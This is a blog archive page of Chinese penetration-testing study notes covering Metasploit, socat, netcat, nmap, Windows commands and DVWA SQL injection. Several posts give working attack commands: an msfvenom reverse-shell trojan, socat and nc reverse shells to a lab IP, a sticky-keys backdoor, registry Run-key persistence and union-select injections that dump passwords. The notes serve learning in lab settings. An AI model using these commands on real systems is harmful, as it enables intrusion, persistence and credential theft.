<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://yoursite.com/page/2/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.0.2"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-MSF基础" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/07/18/MSF%E5%9F%BA%E7%A1%80/" class="article-date">
  <time datetime="2021-07-18T08:42:26.000Z" itemprop="datePublished">2021-07-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/07/18/MSF%E5%9F%BA%E7%A1%80/">MSF基础</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">warnning:</span><br><span class="line">msf数据库未开会显示警报,但是不影响使用,有需求可以开</span><br><span class="line"></span><br><span class="line">systemctl <span class="built_in">enable</span> postgresql        设置postgresql开机自启</span><br><span class="line">systemctl <span class="built_in">disable</span> postgresql    禁止开机自启</span><br><span class="line"></span><br><span class="line">systemctl:    </span><br><span class="line">        <span class="built_in">enable</span>    设置开机自启</span><br><span class="line">        <span class="built_in">disable</span>    禁止开机自启</span><br><span class="line">        start    运行服务</span><br><span class="line">        stop    停止服务</span><br><span class="line">        status    查看运行状态</span><br><span class="line">        restart    重启服务</span><br><span class="line">service:</span><br><span class="line">    service service_name 指令</span><br><span class="line">        start</span><br><span class="line">        stop    </span><br><span class="line">        stauts</span><br><span class="line">        restart            </span><br></pre></td></tr></table></figure>

<p><strong>!!!:指令可以用tab补全</strong></p>
<p>msfconsole        控制台</p>
<p>msfvenom         木马生成平台</p>
<p>exp: 攻击脚本</p>
<p>poc: 验证脚本</p>
<p>信息搜集 –&gt; 漏洞探测 –&gt; 漏洞利用 –&gt; 提权 –&gt; 横向渗透 –&gt; 植入后门 –&gt; 痕迹清除</p>
<p>​    [ metasploit v6.0.16-dev                          ]</p>
<ul>
<li>– –=[ 2073 exploits - 1124 auxiliary - 352 post       ]</li>
<li>– –=[ 596 payloads - 45 encoders - 10 nops            ]</li>
<li>– –=[ 7 evasion                                       ]</li>
</ul>
<p>exploits: 漏洞利用脚本</p>
<p>payloads: 攻击载荷</p>
<p>auxiliary: 辅助模块</p>
<p>post: 后渗透模块</p>
<p>encoders: 编码模块</p>
<p>nops: 空模块</p>
<p>evasion: 逃避模块</p>
<p><code>第一次运行msf需要初始化数据库,因为用到db_nmap需要用到数据库</code></p>
<p>msfdb init    初始化数据库</p>
<p>msfdb start    开启数据库</p>
<p>连接数据库:</p>
<ol>
<li><p>db_connect -y /usr/share/metasploit-framework/config/database.yml</p>
</li>
<li><p>db_connect user:<a href="mailto:&#112;&#x61;&#115;&#x73;&#x77;&#x6f;&#x72;&#100;&#64;&#x31;&#x32;&#x37;&#x2e;&#48;&#x2e;&#x30;&#46;&#x31;">&#112;&#x61;&#115;&#x73;&#x77;&#x6f;&#x72;&#100;&#64;&#x31;&#x32;&#x37;&#x2e;&#48;&#x2e;&#x30;&#46;&#x31;</a>/database_name</p>
</li>
</ol>
<h5 id="基础指令"><a href="#基础指令" class="headerlink" title="基础指令:"></a>基础指令:</h5><h5 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole:"></a>msfconsole:</h5><p>msf是用ruby语言写的,脚本后缀为.rc文件</p>
<p>help     查看帮助信息</p>
<p>exit        退出当前的控制台</p>
<p>load      加载.rc的脚本</p>
<p>sessions    查看当前收到的会话</p>
<p>sessions -i id   进入会话</p>
<p>sessions -k id 杀死指定会话</p>
<p>sessions -K      杀死所有的会话  </p>
<p>bg | background   返回控制台</p>
<p>set          设置参数</p>
<p>setg         设置全局参数</p>
<p>unload    卸载脚本</p>
<p>unset        卸载参数</p>
<p>unsetg     卸载全局参数</p>
<p>info            显示模块的信息</p>
<p>options    显示参数的信息</p>
<p>search        搜索脚本</p>
<p>show            显示模块及参数信息</p>
<p>use                使用模块</p>
<p>run                运行辅助模块,跟exploit没有区别都可以用</p>
<p>exploit        运行攻击脚本</p>
<p>exploit | run -j   后台监听</p>
<p>run -z          持久化监听</p>
<p>run -j -z       后台持久监听</p>
<p>back            返回上一级</p>
<p>jobs            操作相关的工作</p>
<p>jobs -k id    删除指定任务</p>
<p>jobs -K        删除所有的任务</p>
<p>kill                杀死会话</p>
<h5 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom:"></a>msfvenom:</h5><p>-l,–list        列出相关的模块信息</p>
<p>-p,–payloads    指定payload</p>
<p>-e                指定编码模块</p>
<p>-f                指定输出格式</p>
<p>-a                指定架构(x86,x64)</p>
<p>-o                指定输出的文件</p>
<p>-b                bad Characters,坏字符,可以规避一些字符</p>
<p>-n                设置空模块</p>
<p>-i                    指定编码次数</p>
<p>-x                    指定模板</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">基操:</span><br><span class="line">常用payload:</span><br><span class="line">windows/x64/meterpreter/reverse_tcp windows/x64/meterpreter/reverse_tcp_rc4 windows/x64/meterpreter/bind_tc windows/x64/meterpreter/bind_tcp_rc4 windows/x64/meterpreter/reverse_https windows/x64/meterpreter/reverse_http</span><br><span class="line"></span><br><span class="line">生成木马:</span><br><span class="line">-p指定的payload要与msfconsole指定的payload一致,不然无法监听到木马的反弹</span><br><span class="line">msfvenom  -p windows/meterpreter/reverse_tcp lhost=<span class="number">192.168</span><span class="number">.1</span><span class="number">.135</span> lport=<span class="number">4444</span> -f exe -o shell.exe</span><br><span class="line"></span><br><span class="line">建立监听器:</span><br><span class="line">LHOST:设置本地监听的IP</span><br><span class="line">LPORT:设置本地监听的端口</span><br><span class="line">RHOSTS:设置远程IP</span><br><span class="line"></span><br><span class="line">stage: 传输器    --&gt; 存放paylaod的一个容器</span><br><span class="line">stager: 传输体     --&gt; 用来传输stage的一个通道</span><br><span class="line">    </span><br><span class="line">use exploit/multi/handler 设置渗透模块</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp 设置有效载荷</span><br><span class="line">set LHOST IP 设置本地接收ip</span><br><span class="line">set LPORT port 设置本地接收端口</span><br><span class="line">exploit | run 运行模块开始监听</span><br><span class="line"></span><br><span class="line">木马下放:</span><br><span class="line"><span class="number">1.</span> servic apache2 start</span><br><span class="line">    apache是web服务的一个中间件</span><br><span class="line">    默认路径: /var/www/html</span><br><span class="line">    访问方式: http://IP</span><br><span class="line">    注意事项: 可能会碰到默认页面,删除掉/var/www/html下的index.html文件即可</span><br><span class="line"><span class="number">2.</span> python2</span><br><span class="line">    用编程语言开放的服务器,服务器路径的话就是在当前目录下开放服务</span><br><span class="line">    python -m SimpleHTTPServer port</span><br><span class="line"><span class="number">3.</span> python3</span><br><span class="line">    python3 -m http.server port</span><br></pre></td></tr></table></figure>

<h4 id="linux的快捷键"><a href="#linux的快捷键" class="headerlink" title="linux的快捷键"></a>linux的快捷键</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ctrl+u    删除光标之前的内容</span><br><span class="line">ctrl+k    删除光标之后的内容</span><br><span class="line">ctrl+d  删除当前光标所在的内容</span><br><span class="line">ctrl+h    向前删除一个内容</span><br><span class="line">ctrl+a    跳到开头</span><br><span class="line">ctrl+e    跳到最后</span><br><span class="line">ctrl+r    搜索历史操作的指令,回车执行</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2021/07/18/MSF%E5%9F%BA%E7%A1%80/" data-id="ckse84pnd00048wvj6bbxgz1t" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-Socat使用" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/07/16/Socat%E4%BD%BF%E7%94%A8/" class="article-date">
  <time datetime="2021-07-16T07:44:39.000Z" itemprop="datePublished">2021-07-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/07/16/Socat%E4%BD%BF%E7%94%A8/">Socat使用</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h5 id="建立监听器"><a href="#建立监听器" class="headerlink" title="建立监听器"></a>建立监听器</h5><p>socat -d -d tcp4-listen:port stdout                                     <code>--&gt; nc -lvvp</code></p>
<h5 id="建立连接"><a href="#建立连接" class="headerlink" title="建立连接"></a>建立连接</h5><p>socat - tcp4:ip:port                                                                    <code>     --&gt; nc ip port</code></p>
<h5 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h5><p>接收:</p>
<p>socat tcp4:ip:port file:filename,create</p>
<p>传输:</p>
<p>socat tcp4-listen:4444,fork file:filename</p>
<p><code>fork创建子进程,可以建立多个连接</code></p>
<p><strong>可以双向传输</strong></p>
<h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5><p>反向:</p>
<p>socat -d -d tcp4-listen:4444 stdout            建立监听</p>
<p>socat tcp4:192.168.1.135:4444 exec:/bin/bash            反弹shell</p>
<p>正向:</p>
<p>加密传输</p>
<p><strong>生成公钥和私钥</strong></p>
<p>openssl req -newkey rsa:2048 -nodes -keyout <code>bind.key</code> -x509 -days <code>365</code> -out <code>bind.crt</code>    </p>
<p><strong>把公钥和私钥转化为socat传输的格式</strong></p>
<p>cat bind.key bind.crt &gt; bind.pem            </p>
<p><strong>建立监听,并反弹shell</strong></p>
<p>socat openssl-listen:port,verify=0,cert=xxx.pem,fork exec:/bin/bash</p>
<p><strong>建立连接</strong></p>
<p>socat - openssl:ip:port,verify=0</p>
<p><code>!!!:verify=0 --&gt; 禁用ssl</code></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2021/07/16/Socat%E4%BD%BF%E7%94%A8/" data-id="ckse84pnk00078wvj1sxjfzug" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-信息搜集" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/07/14/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" class="article-date">
  <time datetime="2021-07-14T02:31:33.000Z" itemprop="datePublished">2021-07-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/07/14/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">信息搜集</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><h4 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h4><p>1-存活主机</p>
<p>2-端口扫描</p>
<p>3-防火墙侦测</p>
<p>4-漏洞扫描</p>
<p>5-操作系统</p>
<p>banner:指的是指纹(版本信息、服务器(中间件)信息、开发商信息…)</p>
<p>nmap扫描结果的三种状态:</p>
<p>open(开放)</p>
<p>closed(关闭)</p>
<p>filtered(不确定是否开放)</p>
<h4 id="常用操作指令"><a href="#常用操作指令" class="headerlink" title="常用操作指令"></a><strong>常用操作指令</strong></h4><p>基本用法:nmap IP</p>
<p>-Pn:跳过主机存活判断,默认判断存活(推荐)</p>
<p>-sS：SYN扫描（隐匿） </p>
<p>-sV：探测打开的端口以确定服务/版本</p>
<p>-sSV=  -sS   -sV</p>
<p>-O:    操作系统的判断</p>
<p>-T:    扫描速度的设置(推荐T4)</p>
<p>-p:    指定端口扫描,-p 端口号 | -p- 全端口扫描 | -p0-65535|-p100-1000 | -p 80,445,3389</p>
<p>–script=脚本名</p>
<p>–script=模糊测试的脚本简写的名称</p>
<p>-sC：相当于–script=defaults</p>
<p>-oN: 标准输出</p>
<p>​    例如:-oN 1.txt</p>
<h4 id="NC-netcat"><a href="#NC-netcat" class="headerlink" title="NC(netcat)"></a>NC(netcat)</h4><p> 常用参数:</p>
<p> -c | -e: 执行命令或者程序,常用于反弹shell</p>
<p> -l:开启监听</p>
<p> -p:设定端口</p>
<p> -z:零输入输出,常用于端口开放检测,(连上立即断开)</p>
<p> -v -vv:详细信息|更详细的信息</p>
<p> -n:仅显示数字的ip地址,不显示DNS信息</p>
<p>创建监听:</p>
<p>nc -lp 指定端口号                监听端口</p>
<p>nc -lvvp 指定端口号            监听端口并显示详细的信息</p>
<p>nc -lnvp 指定端口号            监听端口并显示详细的信息</p>
<p>连接:</p>
<p>nc ip port</p>
<p>端口扫描:</p>
<p>nc -vz IP 端口号[单个端口,端口列表(80-1024)]</p>
<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell:"></a>反弹shell:</h4><p>在linux中:</p>
<p> # –&gt; 特权用户(比如说 root)</p>
<p> $ –&gt; 普通用户</p>
<p>linux中默认的编码格式:utf8    占两个字符        </p>
<p>windows中默认的编码格式:gbk     占三个字符        </p>
<p>windows命令行切换utf8:chcp 65001</p>
<p>windows命令行切换gbk:chcp 936</p>
<p>lsof -i:port    查看指定端口开放情况</p>
<p>netstat -lutpn 查看端口开放情况</p>
<p>正向连接:指服务器主动反弹shell</p>
<p>​    以linux反弹shell为例:</p>
<p>​    服务端开启监听</p>
<p>​    nc -lvvp port -e /bin/bash</p>
<p>​    客户端连接</p>
<p>​    nc -v ip port </p>
<p>反向连接:指客户端主动反弹shell</p>
<p>​    以windows反弹shell为例:</p>
<p>​    服务端开启监听</p>
<p>​    nc -lvvp 4444</p>
<p>​    客户端反弹shell</p>
<p>​    nc ip port -e “c:\windows\system32\cmd.exe”</p>
<p>​    </p>
<p>​    linux会话提升:python -c “import pty;pty.spawn(‘/bin/bash’)”</p>
<p>python -c “import pty;pty.spawn(‘/bin/bash’)”<br>                id</p>
<p>​                用户id=0(root) 组id=0(root) 组=0(root)</p>
<h4 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h4><p>​    正向传输:</p>
<p>​    传输</p>
<p>​    -q 1 :传输完立马断开,不加就一直卡住</p>
<p>​    nc -lvvp port &lt; 1.txt -q 1</p>
<p>​    接收</p>
<p>​    nc ip port &gt; 2.txt</p>
<p>​    反向传输:</p>
<p>​    传输</p>
<p>​    nc ip port &lt; 1.txt -q 1</p>
<p>​    接收</p>
<p>​    nc -lvvp port &gt; 2.txt</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2021/07/14/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" data-id="ckse84po1000e8wvjdlx3f9so" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-注册表自启动和粘滞键后门" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/07/12/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8C%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8/" class="article-date">
  <time datetime="2021-07-12T03:13:16.000Z" itemprop="datePublished">2021-07-12</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/07/12/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8C%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8/">注册表自启动和粘滞键后门</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="注册表："><a href="#注册表：" class="headerlink" title="注册表："></a>注册表：</h4><p>​    数据类型：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">REG_SZ：字符串：文本字符串</span><br><span class="line">REG_MULTI_SZ：多字符串值：含有多个文本值的字符串</span><br><span class="line">REG_BINARY：二进制数：二进制值，以十六进制显示，</span><br><span class="line">REG_DWORD：双字值；一个32位的二进制值，显示为8位的十六进制值</span><br></pre></td></tr></table></figure>

<p>​    创建注册表：   regedit</p>
<p>自启动路径：</p>
<p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RUN</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\run &#x2F;v hh &#x2F;d &quot;calc.exe&quot; &#x2F;f</span><br><span class="line">reg add keyname ... 创建注册表</span><br><span class="line">&#x2F;v 注册表取名</span><br><span class="line">&#x2F;d 要执行的命令或者程序</span><br><span class="line">&#x2F;f 强制覆盖</span><br><span class="line"></span><br><span class="line">用户克隆</span><br><span class="line">注册表中sam文件下的administrator账户对应的目录文件中的F值覆盖掉普通用户对应目录的F值，权限会被继承</span><br></pre></td></tr></table></figure>

<p>自启动文件夹：win + R –&gt; shell:startup</p>
<p>​    C:\Users\用户名\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</p>
<p>服务配置：win + R –&gt;msconfig</p>
<p>UAC：user account control（用户账户控制）</p>
<p>​        最底下：默认以管理员权限运行</p>
<h4 id="粘滞键后门："><a href="#粘滞键后门：" class="headerlink" title="粘滞键后门："></a>粘滞键后门：</h4><p>​    原理：通过覆盖sethc.exe文件运行cmd</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. takeown &#x2F;F c:\windwos\system32\* &#x2F;A &#x2F;R</span><br><span class="line"></span><br><span class="line">2.cacls c:\windwos\system32\\* &#x2F;T &#x2F;E &#x2F;G administrators:F</span><br><span class="line"></span><br><span class="line">3.copy cmd.exe sethc.exe</span><br><span class="line"></span><br><span class="line">4.连续按5次shift键呼出cmd</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2021/07/12/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8C%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8/" data-id="ckse84poa000j8wvj1wek8830" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-基础命令" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/07/10/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/" class="article-date">
  <time datetime="2021-07-10T04:11:26.000Z" itemprop="datePublished">2021-07-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/07/10/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/">基础命令</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>net user                                      查看用户</p>
<p>net user 用户名 密码                更改密码</p>
<p>net user 用户名 密码 /add        创建用户</p>
<p>net user 用户名 /active:yes       激活用户</p>
<p>ipconfig                                     查看网络配置</p>
<p>ipconfig /all</p>
<p>ipconfig /release                        释放当前IP</p>
<p>ipconfig /renew                          重新获取IP</p>
<p>ipconfig /flushdns                      清除DNS缓存</p>
<p>net localgroup                            查看本地用户组</p>
<p>net localgroup 组名                   查看组下的成员信息</p>
<p>netsh wlan show profiles wifi名 key=clear    查看wifi密码</p>
<p>net start                                      查看运行的服务</p>
<p>tasklist                                        查看进程列表</p>
<p>taskkill                                        操作进程</p>
<p>​        /IM    利用程序名杀死进程</p>
<p>​        /PID   利用进程ID杀死进程</p>
<p>​        /F        强制杀死进程</p>
<p>​        /T        同时杀死子进程</p>
<p>netstat -ano                                查看端口开放信息</p>
<p>管道符：|</p>
<p>重定向符：&gt;（重定向输入输出）、&gt;&gt;(追加)</p>
<p>echo ‘’&gt; 文件名                                生成文件</p>
<p>type 文件名                                     查看文件内容</p>
<p>systeminfo                                       查看操作系统的基本配置</p>
<p>findstr                                              匹配字符串</p>
<p>at 时间点 命令                                计划任务</p>
<p>chdir                                                 列出当前路径</p>
<p><strong>windows不区分大小写，linux严格遵循大小写</strong></p>
<p>whoami            看当前用户</p>
<p>whoami /user   看用户的sid</p>
<p>​    500：代表管理员</p>
<p>​    1000+：普通用户</p>
<p>常用端口：3306 – mysql数据库–&gt;php</p>
<p>​                    445 – smb服务</p>
<p>​                    80 – http（明文传输）</p>
<p>​                    443 – https（加密传输）</p>
<p>​                    21 – ftp</p>
<p>​                    22 – ssh（加密传输）</p>
<p>​                    23 – telnet （明文传输）</p>
<p>​                    3389 – RDP（远程桌面协议）</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2021/07/10/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/" data-id="ckse84po4000g8wvje4ay2lf2" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-SQLlow等级手工注入" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/08/28/SQLlow%E7%AD%89%E7%BA%A7%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" class="article-date">
  <time datetime="2020-08-28T14:30:18.000Z" itemprop="datePublished">2020-08-28</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/08/28/SQLlow%E7%AD%89%E7%BA%A7%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/">SQLlow等级手工注入</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>1.登录DVWA，设置安全等级为LOW<br>2.输入1’order by 2#,有数据内容出现，输入1’order by 3#,没有数据内容显示，说明数据列只有2列<br>3.输入1’union select database(),user()#,查询数据库的名字，用户名<br>4.输入1’union select version(),@@version_compile_os#’,获取数据库版本和当前操作系统<br>5.输入1’union select table_name,table_schema from information_schema.tables where table_schema= ’dvwa’#,获取数据表的名称，注意’dvwa’前面有空格<br>6.输入1’union select user,password from users#,尝试获得用户名和密码<br>7.密码采用md5进行加密，到<a target="_blank" rel="noopener" href="http://www.cmd5.com进行解密/">www.cmd5.com进行解密</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/08/28/SQLlow%E7%AD%89%E7%BA%A7%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" data-id="ckse84pnf00058wvjfsqu4kft" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-SQLlow等级工具注入" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/08/27/SQLlow%E7%AD%89%E7%BA%A7%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5/" class="article-date">
  <time datetime="2020-08-27T12:28:19.000Z" itemprop="datePublished">2020-08-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/08/27/SQLlow%E7%AD%89%E7%BA%A7%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5/">SQLlow等级工具注入</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>SQLMAP利用方式：<br>1.先去拿取这个网站的数据库<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://127.0.0.1/sqls/?id=2&quot;">http://127.0.0.1/sqls/?id=2&quot;</a> –current -db                            –得到当前数据库：sqltext<br>2.再拿取这个网站数据库的数据表<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://127.0.0.1/sqls/?id=2&quot;">http://127.0.0.1/sqls/?id=2&quot;</a> -D sqltext –tables                     –得到当前数据库中的数据表：admin、sqltext<br>3.然后再获取这张数据表中的数据列<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://127.0.0.1/sqls/?id=2&quot;">http://127.0.0.1/sqls/?id=2&quot;</a> -D sqltext -T admin –columns           –得到当前数据库中的数据表中的数据列：id、user、pwd<br>4.最后得到相应的数据<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://127.0.0.1/sqls/?id=2&quot;">http://127.0.0.1/sqls/?id=2&quot;</a> -D sqltext -T admin -C uesr,pwd –dump </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/08/27/SQLlow%E7%AD%89%E7%BA%A7%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5/" data-id="ckse84pna00038wvj4xnc8xnx" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-PHP学习笔记" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/08/12/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="article-date">
  <time datetime="2020-08-12T14:40:42.000Z" itemprop="datePublished">2020-08-12</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/08/12/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">PHP学习笔记</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="PHP是超级文本预处理语言"><a href="#PHP是超级文本预处理语言" class="headerlink" title="PHP是超级文本预处理语言"></a>PHP是超级文本预处理语言</h3><p>格式：<br>‘<!DOCTYPE html></p>
<html>
<body>

</body>
</html>’

<p>PHP基本语法：<br>1.PHP脚本以<?php开始，以?>结束;<br>2.PHP文件默认文件扩展名是”.php”;<br>3.用分号来分割语句;<br>4.变量以$符号开始，后跟变量名称;<br>5.php中的注释：<br>  a.单行注释：//、#<br>  b.多行注释：/*    */</p>
<h3 id="PHP-echo和print语句"><a href="#PHP-echo和print语句" class="headerlink" title="PHP echo和print语句"></a>PHP echo和print语句</h3><p>echo和print区别：<br> echo可以输出一个或多个字符串<br> print只允许输出一个字符串，返回值总为1<br>提示：echo输出速度比print快，echo没有返回值，print有返回值</p>
